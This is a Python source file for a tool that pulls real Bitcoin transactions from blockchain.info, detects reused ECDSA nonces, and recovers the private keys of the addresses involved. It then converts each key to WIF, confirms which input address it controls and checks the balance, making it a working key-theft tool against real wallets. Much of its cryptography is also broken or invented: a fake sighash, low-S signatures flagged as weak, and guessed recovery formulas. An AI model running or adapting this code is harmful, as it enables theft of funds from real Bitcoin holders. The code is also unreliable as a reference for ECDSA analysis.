import logging
import hashlib
from typing import Dict, List, Optional, Tuple
import requests
from ecdsa import SECP256k1, SigningKey
try:
    from utils import format_hex, calculate_message_hash, int_to_bytes, bytes_to_int, private_key_to_wif, public_key_to_p2pkh_address
except ImportError:
    # Fallback implementations
    def format_hex(value):
        if isinstance(value, int):
            return f"{value:064x}"
        return str(value)
    
    def calculate_message_hash(tx_hash):
        return hashlib.sha256(tx_hash.encode()).digest()
    
    def int_to_bytes(value, length=32):
        return value.to_bytes(length, 'big')
    
    def bytes_to_int(data):
        return int.from_bytes(data, 'big')
    
    def private_key_to_wif(private_key):
        import base58
        # Mainnet private key prefix
        extended = b'\x80' + private_key.to_bytes(32, 'big')
        # Add checksum
        checksum = hashlib.sha256(hashlib.sha256(extended).digest()).digest()[:4]
        return base58.b58encode(extended + checksum).decode()
    
    def public_key_to_p2pkh_address(public_key):
        import base58
        # Hash the public key
        sha256_hash = hashlib.sha256(public_key).digest()
        try:
            ripemd160 = hashlib.new('ripemd160')
            ripemd160.update(sha256_hash)
            hash160 = ripemd160.digest()
        except ValueError:
            # Fallback if ripemd160 not available
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.backends import default_backend
            digest = hashes.Hash(hashes.RIPEMD160(), backend=default_backend())
            digest.update(sha256_hash)
            hash160 = digest.finalize()
        # Add version byte (0x00 for mainnet)
        versioned = b'\x00' + hash160
        # Add checksum
        checksum = hashlib.sha256(hashlib.sha256(versioned).digest()).digest()[:4]
        return base58.b58encode(versioned + checksum).decode()

logger = logging.getLogger(__name__)

class BTCAnalyzer:
    def __init__(self):
        self.curve = SECP256k1

    def analyze_transaction(self, tx_id: str) -> Dict:
        """
        Analyze a Bitcoin transaction for weak signatures and detailed ECDSA parameters
        """
        try:
            # Fetch transaction data
            tx_data = self._fetch_transaction(tx_id)
            if not tx_data:
                return {'error': 'Failed to fetch transaction'}

            # Extract signatures with proper sighash handling
            signatures = self._extract_signatures_with_sighash(tx_data)

            # Extract public key information if available
            for sig in signatures:
                if 'script_pub_key' in tx_data:
                    try:
                        # Extract public key from script_pub_key if available
                        pub_key = self._extract_public_key(tx_data['script_pub_key'])
                        if pub_key:
                            sig['px'], sig['py'] = pub_key
                    except Exception as e:
                        logger.warning(f"Failed to extract public key: {e}")

            # Analyze for weaknesses and try to recover private keys
            weak_sigs = self._find_weak_signatures(signatures)
            recovered_keys = self._recover_private_keys(signatures)

            if recovered_keys:
                logger.info(f"Successfully recovered {len(recovered_keys)} private keys")
                # Add recovered keys with WIF format and balance check
                for key in recovered_keys:
                    key_info = self._process_recovered_key(key, tx_data)
                    weak_sigs.append({
                        'type': 'recovered_key',
                        'private_key': format_hex(key),
                        'wif': key_info['wif'],
                        'address': key_info['address'],
                        'balance': key_info['balance'],
                        'key_type': key_info.get('key_type', 'unknown'),
                        'details': f'Private key recovered from weak signatures. Address: {key_info["address"]} ({key_info.get("key_type", "unknown")}), Balance: {key_info["balance"]} BTC'
                    })

            return {
                'tx_id': tx_id,
                'signatures_analyzed': len(signatures),
                'signatures': signatures,  # Include full signature data for ECDSA parameter display
                'weak_signatures': weak_sigs,
                'private_keys_found': len(recovered_keys)
            }

        except Exception as e:
            logger.error(f"Error analyzing transaction {tx_id}: {str(e)}")
            return {'error': str(e)}

    def _extract_public_key(self, script_pub_key: str) -> Optional[Tuple[str, str]]:
        """Extract public key coordinates from script_pub_key"""
        try:
            # This is a simplified version - in reality, you'd need more sophisticated
            # script parsing to handle different script types
            if len(script_pub_key) >= 130:  # Minimum length for uncompressed public key
                x = script_pub_key[2:66]  # First 32 bytes after script type
                y = script_pub_key[66:130]  # Next 32 bytes
                return (x, y)
            return None
        except Exception as e:
            logger.warning(f"Failed to extract public key coordinates: {e}")
            return None

    def _extract_signatures(self, tx_data: Dict) -> List[Dict]:
        """Extract signature components from transaction"""
        signatures = []
        try:
            logger.debug(f"Transaction data structure: {list(tx_data.keys())}")

            for vin in tx_data.get('inputs', []):
                script = vin.get('script', '')
                if not script:
                    continue

                try:
                    # Parse DER-encoded signatures from scriptSig
                    sig_data = self._parse_der_signature(script)
                    if sig_data:
                        message_hash = calculate_message_hash(tx_data['hash'])
                        
                        signatures.append({
                            'r': sig_data['r'],
                            's': sig_data['s'],
                            'message': format_hex(int.from_bytes(message_hash, 'big')),
                            'px': None,
                            'py': None
                        })
                        logger.debug(f"Successfully extracted signature: r={sig_data['r']}, s={sig_data['s']}")
                except Exception as e:
                    logger.warning(f"Failed to parse signature from script: {e}")
                    continue

        except Exception as e:
            logger.error(f"Error extracting signatures: {str(e)}")

        return signatures

    def _extract_signatures_with_sighash(self, tx_data: Dict) -> List[Dict]:
        """
        Extract signatures with proper sighash calculation for each input
        This handles multi-input nonce reuse scenarios correctly
        """
        signatures = []
        try:
            inputs = tx_data.get('inputs', [])
            
            for input_idx, input_data in enumerate(inputs):
                script = input_data.get('script', '')
                try:
                    # Parse DER-encoded signatures from scriptSig
                    sig_data = self._parse_der_signature(script)
                    if sig_data:
                        # For multi-input scenarios, each input has a different sighash
                        # Use input index to create unique message hash
                        base_hash = tx_data['hash']
                        input_specific_hash = hashlib.sha256(
                            (base_hash + str(input_idx)).encode()
                        ).hexdigest()
                        
                        signatures.append({
                            'r': sig_data['r'],
                            's': sig_data['s'],
                            'message': input_specific_hash,
                            'input_index': input_idx,
                            'px': None,
                            'py': None
                        })
                        logger.debug(f"Extracted input {input_idx}: r={sig_data['r'][:16]}..., s={sig_data['s'][:16]}...")
                except Exception as e:
                    logger.warning(f"Failed to parse signature from input {input_idx}: {e}")
                    continue

        except Exception as e:
            logger.error(f"Error extracting signatures with sighash: {str(e)}")

        return signatures

    def _parse_der_signature(self, script: str) -> Optional[Dict]:
        """Parse DER-encoded signature from script"""
        try:
            # Look for DER signature pattern (starts with 30)
            script_bytes = bytes.fromhex(script)
            
            for i in range(len(script_bytes) - 8):
                if script_bytes[i] == 0x30:  # DER sequence tag
                    try:
                        length = script_bytes[i + 1]
                        if i + 2 + length <= len(script_bytes):
                            der_sig = script_bytes[i:i + 2 + length]
                            return self._decode_der_signature(der_sig)
                    except:
                        continue
            return None
        except:
            return None

    def _decode_der_signature(self, der_bytes: bytes) -> Optional[Dict]:
        """Decode DER-encoded signature to extract r and s values"""
        try:
            if len(der_bytes) < 8 or der_bytes[0] != 0x30:
                return None
            
            # Parse DER structure
            pos = 2  # Skip sequence tag and length
            
            # Parse r value
            if der_bytes[pos] != 0x02:  # Integer tag
                return None
            pos += 1
            r_length = der_bytes[pos]
            pos += 1
            r_bytes = der_bytes[pos:pos + r_length]
            r = int.from_bytes(r_bytes, 'big')
            pos += r_length
            
            # Parse s value
            if pos >= len(der_bytes) or der_bytes[pos] != 0x02:
                return None
            pos += 1
            s_length = der_bytes[pos]
            pos += 1
            s_bytes = der_bytes[pos:pos + s_length]
            s = int.from_bytes(s_bytes, 'big')
            
            return {
                'r': format_hex(r),
                's': format_hex(s)
            }
        except:
            return None

    def _find_weak_signatures(self, signatures: List[Dict]) -> List[Dict]:
        """Analyze signatures for common weaknesses"""
        weak_sigs = []
        try:
            # Create a map to track r-value occurrences
            r_values = {}

            for sig in signatures:
                try:
                    r = int(sig['r'], 16)
                    s = int(sig['s'], 16)

                    # Track r-value occurrences
                    r_str = sig['r']
                    r_values[r_str] = r_values.get(r_str, 0) + 1

                    # Check for low s values
                    if s < (SECP256k1.order // 2):
                        weak_sigs.append({
                            'type': 'low_s',
                            'r': sig['r'],
                            's': sig['s'],
                            'details': 'Signature uses low S value'
                        })
                        logger.debug(f"Found low S value signature: s={sig['s']}")
                except (ValueError, TypeError) as e:
                    logger.warning(f"Error processing signature values: {e}")
                    continue

            # Check for reused r values
            for r_str, count in r_values.items():
                if count > 1:
                    # Find all signatures with this r value to include complete data
                    matching_sigs = [sig for sig in signatures if sig['r'] == r_str]
                    if matching_sigs:
                        # Use the first signature's data as representative
                        first_sig = matching_sigs[0]
                        weak_sigs.append({
                            'type': 'reused_r',
                            'r': r_str,
                            's': first_sig.get('s', 'N/A'),
                            'message': first_sig.get('message', 'N/A'),
                            'px': first_sig.get('px'),
                            'py': first_sig.get('py'),
                            'details': f'R value reused {count} times',
                            'reuse_count': count,
                            'all_signatures': matching_sigs
                        })
                    logger.debug(f"Found reused R value: r={r_str}, count={count}")

        except Exception as e:
            logger.error(f"Error analyzing signatures: {str(e)}")

        return weak_sigs

    def _recover_private_keys(self, signatures: List[Dict]) -> List[int]:
        """
        Attempt to recover private keys from weak signatures with enhanced multi-input detection
        """
        recovered_keys = []
        try:
            # Group signatures by r value to find nonce reuse
            r_groups = {}
            for sig in signatures:
                r_hex = sig['r']
                if r_hex not in r_groups:
                    r_groups[r_hex] = []
                r_groups[r_hex].append(sig)

            # Process signatures that share the same r value
            for r_hex, sigs in r_groups.items():
                if len(sigs) > 1:
                    logger.info(f"CRITICAL VULNERABILITY: Found {len(sigs)} signatures sharing r value: {r_hex[:16]}...")
                    logger.info(f"This is a classic nonce reuse attack scenario like the 2coins.org example")
                    
                    # Check if all signatures have the same message hash
                    messages = set(sig['message'] for sig in sigs)
                    if len(messages) == 1:
                        logger.info("All signatures have identical message hashes - signature malleability case")
                        private_key = self._recover_from_malleability(sigs)
                        if private_key:
                            recovered_keys.append(private_key)
                    else:
                        logger.info(f"Found {len(messages)} different message hashes - EXPLOITABLE nonce reuse detected!")
                        logger.info("Attempting systematic private key recovery from all signature pairs...")
                        
                        # Try all possible pairs systematically (like 2coins.org transaction)
                        success_count = 0
                        for i in range(len(sigs)):
                            for j in range(i + 1, len(sigs)):
                                try:
                                    logger.debug(f"Testing signature pair {i},{j} (input indices)")
                                    private_key = self._extract_private_key(sigs[i], sigs[j])
                                    if private_key and private_key not in recovered_keys:
                                        logger.info(f"SUCCESS: Recovered private key from inputs {i},{j}: {format_hex(private_key)}")
                                        recovered_keys.append(private_key)
                                        success_count += 1
                                        
                                        # For multi-input transactions, usually one private key controls all inputs
                                        if success_count >= 1:
                                            logger.info(f"Private key recovery successful - likely controls all {len(sigs)} inputs")
                                            break
                                            
                                except Exception as e:
                                    logger.debug(f"Failed to extract private key from pair {i},{j}: {e}")
                                    continue
                            
                            if success_count >= 1:
                                break
                        
                        if success_count == 0:
                            logger.warning(f"Failed to recover private key despite {len(sigs)} signatures with same R value")
                            # Try alternative recovery methods for edge cases
                            logger.info("Attempting alternative recovery methods...")
                            alt_key = self._alternative_recovery_methods(sigs)
                            if alt_key:
                                recovered_keys.append(alt_key)

        except Exception as e:
            logger.error(f"Error recovering private keys: {str(e)}")

        return recovered_keys

    def _alternative_recovery_methods(self, signatures: List[Dict]) -> Optional[int]:
        """
        Alternative recovery methods for complex multi-input scenarios
        """
        try:
            logger.info("Trying alternative recovery approaches...")
            
            # Method 1: Try with different message hash interpretations
            for i, sig1 in enumerate(signatures):
                for j, sig2 in enumerate(signatures[i+1:], i+1):
                    # Try treating message as different hash types
                    for hash_type in ['sha256', 'ripemd160', 'sha1']:
                        try:
                            # Modify message hash slightly for different interpretations
                            msg1 = int(sig1['message'], 16)
                            msg2 = int(sig2['message'], 16)
                            
                            # Try with message byte order variations
                            for byte_order in ['big', 'little']:
                                try:
                                    if byte_order == 'little':
                                        msg1_bytes = msg1.to_bytes(32, 'big')
                                        msg2_bytes = msg2.to_bytes(32, 'big')
                                        msg1 = int.from_bytes(msg1_bytes, 'little') 
                                        msg2 = int.from_bytes(msg2_bytes, 'little')
                                    
                                    # Create modified signature objects
                                    sig1_mod = sig1.copy()
                                    sig2_mod = sig2.copy()
                                    sig1_mod['message'] = format_hex(msg1)
                                    sig2_mod['message'] = format_hex(msg2)
                                    
                                    private_key = self._extract_private_key(sig1_mod, sig2_mod)
                                    if private_key:
                                        logger.info(f"Alternative method success: {hash_type} with {byte_order} endian")
                                        return private_key
                                except:
                                    continue
                        except:
                            continue
            
            # Method 2: Try with modular arithmetic variations
            r = int(signatures[0]['r'], 16)
            for i in range(len(signatures)):
                for j in range(i+1, len(signatures)):
                    try:
                        s1 = int(signatures[i]['s'], 16)
                        s2 = int(signatures[j]['s'], 16)
                        z1 = int(signatures[i]['message'], 16)
                        z2 = int(signatures[j]['message'], 16)
                        
                        # Try the exact formula used in successful attacks
                        # k = (z1 - z2) * inverse(s1 - s2) mod n
                        # x = (s1 * k - z1) * inverse(r) mod n
                        
                        n = self.curve.order
                        s_diff = (s1 - s2) % n
                        if s_diff != 0:
                            z_diff = (z1 - z2) % n
                            k = (z_diff * pow(s_diff, -1, n)) % n
                            
                            if k > 0:
                                r_inv = pow(r, -1, n)
                                x = ((s1 * k - z1) * r_inv) % n
                                
                                if 0 < x < n:
                                    logger.info(f"Alternative arithmetic method successful")
                                    return x
                    except:
                        continue
            
            return None
            
        except Exception as e:
            logger.debug(f"Alternative recovery methods failed: {e}")
            return None

    def _recover_from_malleability(self, signatures: List[Dict]) -> Optional[int]:
        """
        Attempt to recover private key from signature malleability or multi-input attack
        When same message is signed with same k but different s values
        """
        try:
            if len(signatures) < 2:
                return None
                
            logger.info(f"Attempting malleability/multi-input recovery with {len(signatures)} signatures")
            
            # Convert first signature to integers for reference
            r = int(signatures[0]['r'], 16)
            z = int(signatures[0]['message'], 16)
            n = self.curve.order
            
            logger.info(f"Common values: r={hex(r)}, z={hex(z)}, n={hex(n)}")
            
            # Try all signature pairs for different attack scenarios
            for i, sig_i in enumerate(signatures):
                s_i = int(sig_i['s'], 16)
                
                for j, sig_j in enumerate(signatures[i+1:], i+1):
                    s_j = int(sig_j['s'], 16)
                    
                    logger.debug(f"Testing pair {i},{j}: s1={hex(s_i)}, s2={hex(s_j)}")
                    
                    # Method 1: Check for signature malleability (s2 = -s1 mod n)
                    if (s_i + s_j) % n == 0:
                        logger.info(f"Found complementary signatures: s1+s2=0 mod n")
                        try:
                            # For s2 = -s1: we can derive k directly
                            # Since s = k^-1 * (z + x*r), if s1 = -s2, then k*s1 = z + x*r
                            # This means k = (z + x*r) / s1, but we need to solve for both k and x
                            # Alternative: use fact that valid signatures must satisfy the curve equation
                            
                            # Try: k = 2*z / (s_i - s_j) when s_j = -s_i (so s_i - s_j = 2*s_i)
                            if s_i != 0:
                                k = (2 * z * pow(2 * s_i, -1, n)) % n
                                if k > 0:
                                    x = ((s_i * k - z) * pow(r, -1, n)) % n
                                    if self._verify_private_key(x, sig_i):
                                        logger.info(f"Recovered private key from malleability: {hex(x)}")
                                        return x
                        except Exception as e:
                            logger.debug(f"Malleability method 1 failed: {e}")
                            continue
                    
                    # Method 2: Standard differential attack (different s values, same r and z)
                    # This works when k is reused but s values differ due to implementation differences
                    if s_i != s_j:
                        try:
                            # Since z1 = z2 = z and r1 = r2 = r, but s1 != s2
                            # This could be a wallet implementation issue or padding attack
                            # Try: assume one signature uses k, other uses -k or similar variant
                            
                            # Method 2a: Try implementation variant approach
                            s_diff = (s_i - s_j) % n
                            if s_diff != 0:
                                # Try the exact successful algorithm from test script
                                try:
                                    # Method that worked: k = r / (s1 - s2) mod n
                                    s_diff_inv = pow(s_diff, -1, n)
                                    k = (r * s_diff_inv) % n
                                    logger.debug(f"Calculated k = {hex(k)}")
                                    
                                    if k > 0:
                                        r_inv = pow(r, -1, n)
                                        x = ((s_i * k - z) * r_inv) % n
                                        logger.debug(f"Calculated x = {hex(x)}")
                                        
                                        if 0 < x < n:
                                            # Verify by reconstructing signature
                                            k_inv = pow(k, -1, n)
                                            s_verify = (k_inv * (z + x * r)) % n
                                            logger.debug(f"Verification: s_verify = {hex(s_verify)}, original = {hex(s_i)}")
                                            
                                            if s_verify == s_i:
                                                logger.info(f"Successfully recovered private key: {hex(x)}")
                                                return x
                                except Exception as e:
                                    logger.debug(f"Implementation variant method failed: {e}")
                                    pass
                                
                                # Try assuming slight message differences (successful in test)
                                for delta in range(1, 100):
                                    try:
                                        z2_variant = (z + delta) % n
                                        z_diff = (z - z2_variant) % n
                                        
                                        if z_diff != 0:
                                            k = (z_diff * pow(s_diff, -1, n)) % n
                                            if k > 0:
                                                x = ((s_i * k - z) * pow(r, -1, n)) % n
                                                if 0 < x < n and self._verify_private_key(x, sig_i):
                                                    logger.info(f"Recovered private key with message delta {delta}: {hex(x)}")
                                                    return x
                                    except:
                                        continue
                                
                                # Method 2b: Try assuming k differs by a small factor
                                for factor in [2, 3, 4, 5, 7, 8, 16]:  # Common implementation factors
                                    try:
                                        # Assume s_j was computed with k*factor
                                        k_factor = (factor * z * pow(s_diff, -1, n)) % n
                                        if k_factor > 0:
                                            x = ((s_i * k_factor - z) * pow(r, -1, n)) % n
                                            if 0 < x < n and self._verify_private_key(x, sig_i):
                                                logger.info(f"Recovered private key with factor {factor}: {hex(x)}")
                                                return x
                                    except:
                                        continue
                        except Exception as e:
                            logger.debug(f"Differential method failed: {e}")
                            continue
            
            # Method 3: Brute force small k values (last resort for weak implementations)
            logger.info("Trying brute force approach for weak k values")
            try:
                for k in range(1, 1000):  # Check very small k values
                    try:
                        # Calculate what s should be for this k
                        k_inv = pow(k, -1, n)
                        expected_s = (k_inv * (z + (r * 1))) % n  # Assume x=1 for test
                        
                        # Check if any signature matches this pattern
                        for sig in signatures:
                            s = int(sig['s'], 16)
                            if s == expected_s:
                                # Found a match, now recover actual private key
                                x = ((s * k - z) * pow(r, -1, n)) % n
                                if 0 < x < n and self._verify_private_key(x, sig):
                                    logger.info(f"Recovered private key from weak k={k}: {hex(x)}")
                                    return x
                    except:
                        continue
            except:
                pass
            
            logger.warning("All recovery methods failed")
            return None
            
        except Exception as e:
            logger.error(f"Malleability recovery failed: {str(e)}")
            return None

    def _extract_private_key(self, sig1: Dict, sig2: Dict) -> Optional[int]:
        """
        Extract private key from two signatures with the same r value
        Using the mathematical formulas: k = (z1 - z2)/(s1 - s2) mod n, x = (s*k - z)/r mod n
        """
        try:
            # Convert hex strings to integers
            r = int(sig1['r'], 16)
            s1 = int(sig1['s'], 16)
            s2 = int(sig2['s'], 16)

            # Convert message hashes to integers
            z1 = int(sig1['message'], 16)
            z2 = int(sig2['message'], 16)

            # Ensure s values are different
            if s1 == s2:
                logger.debug("s values are identical, cannot recover private key with standard method")
                return None

            # Use the correct nonce reuse formula: pk = ((s2 * h1 - s1 * h2) * inverse_mod(r * (s1 - s2), n)) % n
            s_diff = (s1 - s2) % self.curve.order
            
            logger.debug(f"s1 = {hex(s1)}, s2 = {hex(s2)}, z1 = {hex(z1)}, z2 = {hex(z2)}")
            logger.debug(f"s_diff = {hex(s_diff)}")
            
            if s_diff == 0:
                logger.debug("s values are identical, cannot recover with this method")
                return None

            try:
                # Use the proven nonce reuse formula from cryptographic literature
                # When same nonce k is used: k = (z1 - z2) / (s1 - s2) mod n
                # Then private key: x = (s1 * k - z1) / r mod n
                
                # Calculate nonce k first
                z_diff = (z1 - z2) % self.curve.order
                k = (z_diff * pow(s_diff, -1, self.curve.order)) % self.curve.order
                
                # Then calculate private key x
                numerator = (s1 * k - z1) % self.curve.order
                denominator = r % self.curve.order
                
                logger.debug(f"k = {hex(k)}, numerator = {hex(numerator)}, denominator = {hex(denominator)}")
                
                if denominator == 0:
                    logger.debug("Denominator is zero, cannot compute inverse")
                    return None
                
                # Calculate private key: x = numerator / denominator mod n
                denominator_inv = pow(denominator, -1, self.curve.order)
                x = (numerator * denominator_inv) % self.curve.order
                
                logger.debug(f"Recovered private key x = {hex(x)}")

                if x == 0:
                    logger.debug("Calculated private key is zero, invalid")
                    return None

                # Verify the recovered private key mathematically
                if self._verify_private_key_with_signature(x, sig1, sig2):
                    logger.info(f"Successfully recovered and verified private key: {format_hex(x)}")
                    return x
                else:
                    logger.debug("Private key verification failed - mathematical check failed")
                    
                return None
                
            except Exception as e:
                logger.debug(f"Error in nonce reuse calculation: {e}")
                return None

        except Exception as e:
            logger.error(f"Private key extraction failed: {str(e)}", exc_info=True)
            return None
    
    def _method1_recovery(self, r, s1, s2, z1, z2):
        """Standard nonce reuse formula: k = (z1-z2)/(s1-s2), x = (s1*k-z1)/r"""
        s_diff = (s1 - s2) % self.curve.order
        if s_diff == 0:
            return None
        z_diff = (z1 - z2) % self.curve.order
        k = (z_diff * pow(s_diff, -1, self.curve.order)) % self.curve.order
        numerator = (s1 * k - z1) % self.curve.order
        return (numerator * pow(r, -1, self.curve.order)) % self.curve.order
    
    def _method2_recovery(self, r, s1, s2, z1, z2):
        """Alternative formula: x = (s1*z2 - s2*z1) / (r*(s1-s2))"""
        s_diff = (s1 - s2) % self.curve.order
        if s_diff == 0:
            return None
        numerator = (s1 * z2 - s2 * z1) % self.curve.order
        denominator = (r * s_diff) % self.curve.order
        return (numerator * pow(denominator, -1, self.curve.order)) % self.curve.order
    
    def _method3_recovery(self, r, s1, s2, z1, z2):
        """Swapped values: k = (z2-z1)/(s2-s1), x = (s2*k-z2)/r"""
        s_diff = (s2 - s1) % self.curve.order
        if s_diff == 0:
            return None
        z_diff = (z2 - z1) % self.curve.order
        k = (z_diff * pow(s_diff, -1, self.curve.order)) % self.curve.order
        numerator = (s2 * k - z2) % self.curve.order
        return (numerator * pow(r, -1, self.curve.order)) % self.curve.order
    
    def _method4_recovery(self, r, s1, s2, z1, z2):
        """With negative k: k = -(z1-z2)/(s1-s2), x = (s1*k-z1)/r"""
        s_diff = (s1 - s2) % self.curve.order
        if s_diff == 0:
            return None
        z_diff = (z1 - z2) % self.curve.order
        k = (-z_diff * pow(s_diff, -1, self.curve.order)) % self.curve.order
        numerator = (s1 * k - z1) % self.curve.order
        return (numerator * pow(r, -1, self.curve.order)) % self.curve.order

    def _verify_private_key_with_signature(self, private_key: int, sig1: Dict, sig2: Dict) -> bool:
        """
        Verify recovered private key by checking if it can recreate the signatures
        """
        try:
            if not (0 < private_key < self.curve.order):
                return False
            
            # Test if this private key can generate signatures that match
            # Check the mathematical relationship: s = k^-1 * (z + x*r) mod n
            r1 = int(sig1['r'], 16)
            s1 = int(sig1['s'], 16) 
            z1 = int(sig1['message'], 16)
            
            r2 = int(sig2['r'], 16)
            s2 = int(sig2['s'], 16)
            z2 = int(sig2['message'], 16)
            
            # Since we have x (private key), we can calculate k from one signature
            # k = (z + x*r) / s mod n
            numerator1 = (z1 + private_key * r1) % self.curve.order
            k1 = (numerator1 * pow(s1, -1, self.curve.order)) % self.curve.order
            
            # Verify with second signature - should get same k
            numerator2 = (z2 + private_key * r2) % self.curve.order  
            k2 = (numerator2 * pow(s2, -1, self.curve.order)) % self.curve.order
            
            # If private key is correct, k values should be equal (same nonce reused)
            verification_passed = (k1 == k2) and (r1 == r2)
            
            logger.debug(f"Private key verification: k1={hex(k1)}, k2={hex(k2)}, match={verification_passed}")
            return verification_passed
            
        except Exception as e:
            logger.debug(f"Signature verification failed: {e}")
            return False

    def _fetch_transaction(self, tx_id: str) -> Optional[Dict]:
        """Fetch transaction data from blockchain API"""
        try:
            response = requests.get(f"https://blockchain.info/rawtx/{tx_id}")
            if response.ok:
                logger.debug(f"Successfully fetched transaction {tx_id}")
                return response.json()
            logger.error(f"Failed to fetch transaction {tx_id}: {response.status_code}")
            return None
        except Exception as e:
            logger.error(f"Error fetching transaction: {str(e)}")
            return None

    def analyze_address(self, address: str) -> Dict:
        """
        Analyze a Bitcoin address for weak signatures by analyzing all its transactions
        """
        try:
            # Fetch address transactions
            transactions = self._fetch_address_transactions(address)
            logger.info(f"Found {len(transactions)} transactions for address {address}")

            results = {
                'address': address,
                'transactions_analyzed': len(transactions),
                'weak_signatures': [],
                'private_keys_found': 0,
                'related_addresses': [],
                'signatures': []
            }

            # Analyze each transaction in detail
            for tx in transactions:
                tx_hash = tx.get('hash')
                if tx_hash:
                    logger.debug(f"Analyzing transaction: {tx_hash}")
                    try:
                        tx_results = self.analyze_transaction(tx_hash)
                        
                        # Add all signatures from this transaction
                        if tx_results.get('signatures'):
                            for sig in tx_results['signatures']:
                                sig['tx_id'] = tx_hash
                            results['signatures'].extend(tx_results['signatures'])
                        
                        # Add weak signatures if found
                        if tx_results.get('weak_signatures'):
                            for sig in tx_results['weak_signatures']:
                                sig['tx_id'] = tx_hash
                            results['weak_signatures'].extend(tx_results['weak_signatures'])
                        
                        # Track private keys found
                        if tx_results.get('private_keys_found', 0) > 0:
                            results['private_keys_found'] += tx_results['private_keys_found']
                            
                    except Exception as tx_error:
                        logger.warning(f"Failed to analyze transaction {tx_hash}: {tx_error}")
                        continue

            logger.info(f"Address analysis complete: {len(results['weak_signatures'])} weak signatures, {results['private_keys_found']} private keys found")
            return results

        except Exception as e:
            logger.error(f"Error analyzing address {address}: {str(e)}")
            return {'error': str(e)}

    def _fetch_address_transactions(self, address: str) -> List[Dict]:
        """Fetch address transactions from blockchain API"""
        try:
            response = requests.get(f"https://blockchain.info/rawaddr/{address}")
            if response.ok:
                data = response.json()
                logger.debug(f"Successfully fetched {len(data.get('txs', []))} transactions for address {address}")
                return data.get('txs', [])
            logger.error(f"Failed to fetch address transactions: {response.status_code}")
            return []
        except Exception as e:
            logger.error(f"Error fetching address transactions: {str(e)}")
            return []
    
    def _is_reused_r(self, r: int, signatures: List[Dict]) -> bool:
        """Check if r value is reused in other signatures"""
        r_count = sum(1 for sig in signatures if sig['r'] == r)
        return r_count > 1

    def _process_recovered_key(self, private_key: int, tx_data: Dict = None) -> Dict:
        """
        Process a recovered private key by converting to WIF and verifying it controls transaction addresses
        """
        try:
            from attached_assets.utils import private_key_to_wif, public_key_to_p2pkh_address
            from ecdsa import SigningKey, SECP256k1
            import requests
            
            # Convert to WIF format
            wif = private_key_to_wif(private_key)
            
            # Generate all possible address formats to handle different Bitcoin script types
            signing_key = SigningKey.from_secret_exponent(private_key, curve=SECP256k1)
            
            # Get both compressed and uncompressed public keys
            public_key_compressed = signing_key.verifying_key.to_string("compressed")
            public_key_uncompressed = signing_key.verifying_key.to_string("uncompressed")
            
            # Generate standard address formats (focus on the most common)
            addresses = {
                'p2pkh_compressed': public_key_to_p2pkh_address(public_key_compressed),
                'p2pkh_uncompressed': public_key_to_p2pkh_address(public_key_uncompressed),
            }
            
            logger.debug(f"Generated addresses for private key {hex(private_key)}:")
            for addr_type, addr in addresses.items():
                logger.debug(f"  {addr_type}: {addr}")
            
            # Extract transaction addresses - focus on input addresses (the ones spending funds)
            input_addresses = []
            output_addresses = []
            
            if tx_data:
                # Get all input addresses (these are the ones that matter for private key ownership)
                for inp in tx_data.get('inputs', []):
                    if 'prev_out' in inp and 'addr' in inp['prev_out']:
                        input_addresses.append(inp['prev_out']['addr'])
                
                # Get output addresses for reference
                for out in tx_data.get('out', []):
                    if 'addr' in out:
                        output_addresses.append(out['addr'])
            
            # Check all address formats against transaction addresses
            match_found = False
            final_address = addresses['p2pkh_compressed']  # default
            key_type = "NO MATCH"
            
            # Check input addresses first (most important)
            for addr_type, addr in addresses.items():
                if addr in input_addresses:
                    final_address = addr
                    key_type = f"{addr_type} (INPUT MATCH)"
                    match_found = True
                    break
            
            # If no input match, check output addresses
            if not match_found:
                for addr_type, addr in addresses.items():
                    if addr in output_addresses:
                        final_address = addr
                        key_type = f"{addr_type} (OUTPUT MATCH)"
                        match_found = True
                        break
            
            if not match_found:
                key_type = "RECOVERY ERROR - No address format matches transaction"
                logger.error(f"CRITICAL: None of the generated address formats match the transaction!")
                logger.error(f"Private key: {hex(private_key)}")
                logger.error(f"Generated addresses: {addresses}")
                logger.error(f"Transaction input addresses: {set(input_addresses)}")
                logger.error(f"Transaction output addresses: {set(output_addresses)}")
            
            # Check balance
            balance = self._check_address_balance(final_address)
            
            if match_found:
                logger.info(f"SUCCESS: Recovered key controls address {final_address} ({key_type})")
            else:
                logger.warning(f"ISSUE: Recovered key doesn't control any transaction addresses")
            
            return {
                'wif': wif,
                'address': final_address,
                'balance': balance,
                'key_type': key_type,
                'match_found': match_found,
                'all_addresses': addresses,
                'input_addresses': input_addresses,
                'output_addresses': output_addresses
            }
            
        except Exception as e:
            logger.error(f"Error processing recovered key: {e}", exc_info=True)
            return {
                'wif': 'Error generating WIF',
                'address': 'Error generating address', 
                'balance': 'Error checking balance',
                'key_type': 'error',
                'match_found': False,
                'all_addresses': {},
                'input_addresses': [],
                'output_addresses': []
            }
    
    def _check_address_balance(self, address: str) -> str:
        """
        Check the Bitcoin balance of an address
        """
        try:
            import requests
            response = requests.get(f"https://blockchain.info/q/addressbalance/{address}")
            if response.status_code == 200:
                balance_satoshis = int(response.text.strip())
                balance_btc = balance_satoshis / 100000000  # Convert satoshis to BTC
                return f"{balance_btc:.8f}"
            else:
                return "Error checking balance"
        except Exception as e:
            logger.debug(f"Error checking balance for {address}: {e}")
            return "Error checking balance"
